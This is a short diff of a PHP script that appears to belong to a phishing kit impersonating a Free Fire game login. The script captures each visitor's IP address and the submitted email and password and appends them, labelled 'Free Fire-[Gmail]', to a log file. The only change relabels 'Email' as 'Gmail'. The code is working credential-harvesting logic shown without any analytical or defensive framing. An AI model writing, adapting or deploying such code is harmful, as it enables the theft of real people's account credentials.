@@ -29,7 +29,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 $a1 = $_POST['email'];
 $b1 = $_POST['password'];
 
-$datas = "==11{$ipaddress}== ==12Free Fire-[Email]== ==13{$a1}== ==14{$b1}==";
+$datas = "==11{$ipaddress}== ==12Free Fire-[Gmail]== ==13{$a1}== ==14{$b1}==";
 
 $sendhits = "../../log.txt";
 $x = fopen($sendhits, "a+");
